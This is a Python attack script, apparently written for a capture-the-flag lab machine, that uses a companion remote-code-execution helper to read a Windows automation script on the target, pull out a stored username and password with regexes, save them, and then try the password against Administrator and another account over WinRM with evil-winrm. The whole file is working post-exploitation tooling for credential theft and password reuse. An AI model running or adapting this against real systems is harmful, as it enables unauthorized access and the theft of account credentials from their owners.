#!/usr/bin/env python3
"""
extract_creds.py - Extract credentials from target system
==========================================================

Uses file-based RCE to extract credentials from known locations.

KNOWN CREDENTIAL LOCATIONS:
  - C:\\Program Files\\Automation Scripts\\seleniumSimulator.py (Django admin)
  - Other config files as discovered

USAGE:
  python3 extract_creds.py                    # Extract all known credentials
  python3 extract_creds.py --check-winrm      # Also test WinRM access

"""

import argparse
import glob
import json
import os
import re
import subprocess
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TMP_DIR = os.path.join(SCRIPT_DIR, "tmp")
CREDS_FILE = os.path.join(TMP_DIR, "extracted_creds.json")

# ANSI colors
class C:
    G = '\033[92m'
    R = '\033[91m'
    Y = '\033[93m'
    C = '\033[96m'
    B = '\033[94m'
    BOLD = '\033[1m'
    X = '\033[0m'

def success(msg): print(f"{C.G}[+]{C.X} {msg}")
def error(msg): print(f"{C.R}[-]{C.X} {msg}")
def info(msg): print(f"{C.C}[*]{C.X} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.X} {msg}")


def run_rce_cmd(cmd):
    """Run a command via load_extension_rce.py and return output"""
    # Run the RCE command
    result = subprocess.run(
        ['python3', os.path.join(SCRIPT_DIR, 'load_extension_rce.py'),
         '--file-cmd', cmd, '--force'],
        capture_output=True,
        text=True,
        cwd=SCRIPT_DIR
    )

    # Find the most recent output file
    output_files = glob.glob(os.path.join(TMP_DIR, 'cmd_output_output_*.txt'))
    if not output_files:
        return None

    # Get the most recent file
    latest_file = max(output_files, key=os.path.getmtime)

    # Read and return the content
    with open(latest_file, 'r') as f:
        return f.read().strip()


def extract_selenium_creds():
    """Extract credentials from seleniumSimulator.py"""
    info("Extracting credentials from seleniumSimulator.py...")

    content = run_rce_cmd('type "C:\\Program Files\\Automation Scripts\\seleniumSimulator.py"')

    if not content:
        error("Failed to read seleniumSimulator.py")
        return None

    creds = {}

    # Extract username
    user_match = re.search(r'"username":\s*"([^"]+)"', content)
    if user_match:
        creds['username'] = user_match.group(1)

    # Extract password
    pass_match = re.search(r'"password":\s*"([^"]+)"', content)
    if pass_match:
        creds['password'] = pass_match.group(1)

    if creds:
        success(f"Found credentials: {creds['username']}:{creds['password']}")
        return {
            'source': 'seleniumSimulator.py',
            'type': 'django_admin',
            'username': creds.get('username'),
            'password': creds.get('password')
        }

    return None


def test_winrm(username, password):
    """Test WinRM access with credentials"""
    info(f"Testing WinRM access as {username}...")

    result = subprocess.run(
        ['evil-winrm', '-i', 'eloquia.htb', '-u', username, '-p', password, '-c', 'whoami'],
        capture_output=True,
        text=True,
        timeout=30
    )

    if 'WinRMAuthorizationError' in result.stderr:
        warn(f"WinRM auth failed for {username}")
        return False
    elif result.returncode == 0:
        success(f"WinRM access successful as {username}!")
        return True
    else:
        warn(f"WinRM test inconclusive for {username}")
        return False


def save_creds(creds_list):
    """Save extracted credentials to file"""
    os.makedirs(TMP_DIR, exist_ok=True)

    with open(CREDS_FILE, 'w') as f:
        json.dump(creds_list, f, indent=2)

    success(f"Credentials saved to: {CREDS_FILE}")


def main():
    parser = argparse.ArgumentParser(description='Extract credentials from target')
    parser.add_argument('--check-winrm', action='store_true',
                        help='Test extracted credentials against WinRM')
    args = parser.parse_args()

    print(f"\n{C.B}{C.BOLD}CREDENTIAL EXTRACTION{C.X}")
    print(f"{C.B}{'='*50}{C.X}\n")

    all_creds = []

    # Extract from seleniumSimulator.py
    selenium_creds = extract_selenium_creds()
    if selenium_creds:
        all_creds.append(selenium_creds)

    # Display results
    if all_creds:
        print(f"\n{C.G}{'='*50}{C.X}")
        print(f"{C.G}{C.BOLD}  EXTRACTED CREDENTIALS{C.X}")
        print(f"{C.G}{'='*50}{C.X}\n")

        for cred in all_creds:
            print(f"  Source:   {cred['source']}")
            print(f"  Type:     {cred['type']}")
            print(f"  Username: {C.Y}{cred['username']}{C.X}")
            print(f"  Password: {C.Y}{cred['password']}{C.X}")
            print()

        save_creds(all_creds)

        # Test WinRM if requested
        if args.check_winrm:
            print(f"\n{C.B}Testing WinRM Access...{C.X}\n")

            # Test accounts
            test_accounts = [
                ('Administrator', selenium_creds['password']),
                ('Olivia.KAT', selenium_creds['password']),
            ]

            for user, passwd in test_accounts:
                try:
                    test_winrm(user, passwd)
                except Exception as e:
                    warn(f"WinRM test failed for {user}: {e}")
    else:
        error("No credentials extracted")
        return 1

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.X}")
        sys.exit(1)
